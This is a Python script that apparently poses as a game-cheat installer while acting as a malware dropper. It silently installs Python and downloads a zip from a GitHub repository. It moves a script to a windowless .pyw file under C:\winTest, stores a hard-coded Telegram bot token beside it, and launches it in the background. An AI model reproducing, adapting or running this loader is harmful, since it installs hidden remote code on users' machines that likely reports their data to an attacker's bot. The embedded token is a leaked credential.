import subprocess

abs="6756109849:AAE9FLHPc3pV5vexITSGVZCzu_v-r-Kkf2o"
def downloadPython(path):
    urllib.request.urlretrieve("https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe",path)
def getDownloadPath():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('python-3.12.1-amd64.exe')
    path='\\'.join(path)
    return path
def getDownPathExe():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('cs2_cs-go_cheat.exe')
    path='\\'.join(path)
    return path
def setupPython(path):
    os.system(path)
def createRootDir():
    if not os.path.isdir('C:\\winTest'):
        os.mkdir('C:\\winTest')
        with open("C:\\winTest\\dir.txt","w") as file:
            file.write(getDownPathExe())
def downloadWinSt():
    url = 'https://api.github.com/repos/Nick1t0s/zg/zipball'
    response = requests.get(url)
    zip_data = response.content

    with open('C:\\winTest\\archive.zip', 'wb') as file:
        file.write(zip_data)
def deArchibeWinSt():
    with ZipFile('C:\\winTest\\archive.zip', 'r') as zip_ref:
        zip_ref.extractall("C:\\winTest")
def moveWinStart():
    dirSetupName = [c for c in os.listdir("C:\\winTest") if "zg" in c][0]
    shutil.move(f"C:\\winTest\\{dirSetupName}\\winStart{'.py'}",f"C:\\winTest\\winStart{'.pyw'}")
def deleteArchiveAndDir():
    dirSetupName = [c for c in os.listdir("C:\\winTest") if "zg" in c][0]
    os.remove("C:\\winTest\\archive.zip")
    shutil.rmtree(f"C:\\winTest\\{dirSetupName}")
def createdir1():
    with open('C:\\winTest\\dir1.txt','w') as file:
        file.write(abs)
def startWinStart():
    proc=subprocess.Popen(["python","C:\\winTest\\winStart.pyw"])


import os
import urllib.request
import requests
from zipfile import ZipFile
import os
import shutil
pathToPythonExe=getDownloadPath()
downloadPython(pathToPythonExe)
setupPython(pathToPythonExe)
createRootDir()
downloadWinSt()
deArchibeWinSt()
moveWinStart()
deleteArchiveAndDir()
createdir1()
print("____________________________________________________________")
print("SetupIsSucseful")
startWinStart()

